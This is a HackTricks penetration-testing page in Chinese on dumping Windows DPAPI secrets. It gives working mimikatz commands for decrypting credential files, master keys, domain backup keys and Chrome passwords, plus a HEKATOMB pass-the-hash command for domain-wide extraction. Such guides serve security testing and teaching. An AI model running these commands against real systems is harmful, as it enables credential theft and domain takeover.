# DPAPI - 提取密码

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的网络安全活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士的热点交流平台。

{% embed url="https://www.rootedcon.com/" %}

在创建这篇文章时，mimikatz在与DPAPI交互的每个操作中都遇到了问题，因此**大部分示例和图片都来自于**：[https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)

## 什么是DPAPI

在Windows操作系统中，DPAPI的主要用途是使用用户或系统密钥作为熵的重要贡献，对非对称私钥执行对称加密。\
**DPAPI允许开发人员使用从用户登录凭据派生的对称密钥来加密密钥**，或者在系统加密的情况下，使用系统的域身份验证凭据。

这使得开发人员可以非常容易地在计算机中**保存加密数据**，而无需担心如何**保护**加密**密钥**。

### DPAPI保护什么？

DPAPI用于保护以下个人数据：

* Internet Explorer、Google Chrome中的密码和表单自动完成数据
* Outlook、Windows Mail等中的电子邮件帐户密码
* 内部FTP管理器帐户密码
* 共享文件夹和资源访问密码
* 无线网络帐户密钥和密码
* Windows CardSpace和Windows Vault中的加密密钥
* 远程桌面连接密码，.NET Passport
* 用于加密文件系统（EFS）、加密邮件S-MIME、其他用户证书、Internet Information Services中的SSL/TLS的私钥
* EAP/TLS和802.1x（VPN和WiFi身份验证）
* 凭据管理器中的网络密码
* 任何使用API函数CryptProtectData进行编程保护的应用程序中的个人数据。例如，在Skype、Windows Rights Management Services、Windows Media、MSN Messenger、Google Talk等中。
* ...

{% hint style="info" %}
使用DPAPI保护数据的一个成功而巧妙的例子是在Internet Explorer中实现自动完成密码加密算法。为了加密某个网页的登录和密码，它调用CryptProtectData函数，在可选的熵参数中指定了网页的地址。因此，除非知道输入密码的原始URL，否则没有人，甚至是Internet Explorer本身，都无法解密该数据。
{% endhint %}

## 列出Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 凭证文件

**由主密码保护的凭证文件**可能位于以下位置：
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
使用mimikatz的`dpapi::cred`命令获取凭据信息，在响应中可以找到有趣的信息，如加密数据和guidMasterKey。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
您可以使用**mimikatz模块** `dpapi::cred` 和适当的 `/masterkey` 来解密：
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## 主密钥

用于加密用户RSA密钥的DPAPI密钥存储在`%APPDATA%\Microsoft\Protect\{SID}`目录下，其中{SID}是该用户的[**安全标识符**](https://en.wikipedia.org/wiki/Security\_Identifier)。**DPAPI密钥存储在与保护用户私钥的主密钥相同的文件中**。它通常是64个字节的随机数据。（请注意，此目录受保护，因此无法使用`dir`命令列出，但可以使用PS列出）。
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
以下是用户的一组主密钥的样子：

![](<../../.gitbook/assets/image (324).png>)

通常，**每个主密钥都是一个加密的对称密钥，可以用来解密其他内容**。因此，提取**加密的主密钥**是有趣的，以便稍后解密使用该密钥加密的**其他内容**。

### 提取主密钥并解密

在前面的部分中，我们找到了一个名为`3e90dd9e-f901-40a1-b691-84d7f647b8fe`的guidMasterKey，该文件将位于：
```
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>
```
在哪里可以使用mimikatz提取主密钥：
```bash
# If you know the users password
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected

# If you don't have the users password and inside an AD
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc
```
文件的主密钥将出现在输出中。

最后，您可以使用该**主密钥**来**解密****凭据文件**：
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
```
### 使用管理员权限提取所有本地主密钥

如果您是管理员，可以使用以下方法获取dpapi主密钥：
```
sekurlsa::dpapi
```
![](<../../.gitbook/assets/image (326).png>)

### 提取所有备份的主密钥（Master Keys）与域管理员

域管理员可以获取备份的dpapi主密钥，用于解密加密的密钥：
```
lsadump::backupkeys /system:dc01.offense.local /export
```
使用检索到的备份密钥，让我们解密用户的 `spotless` 主密钥：
```bash
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```
我们现在可以使用解密后的主密钥解密用户的`spotless` Chrome 密钥。
```
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```
## 加密和解密内容

您可以在以下链接中找到使用mimikatz和C++对数据进行加密和解密的示例：[https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
您可以在以下链接中找到使用C#对数据进行加密和解密的示例：[https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1)是[@gentilkiwi](https://twitter.com/gentilkiwi)的[Mimikatz](https://github.com/gentilkiwi/mimikatz/)项目中一些DPAPI功能的C#端口。

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)是一个自动化从LDAP目录中提取所有用户和计算机以及通过RPC提取域控制器备份密钥的工具。然后，脚本将解析所有计算机的IP地址，并在所有计算机上执行smbclient以检索所有用户的DPAPI blob，并使用域备份密钥解密所有内容。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

使用从LDAP计算机列表中提取的信息，即使您不知道它们，也可以找到每个子网络！

"因为仅仅拥有域管理员权限是不够的。攻破它们全部。"

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI)可以自动转储由DPAPI保护的秘密。

## 参考资料

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)是**西班牙**最重要的网络安全活动之一，也是**欧洲**最重要的网络安全活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士的热点聚集地。

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中宣传您的公司吗？或者您想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
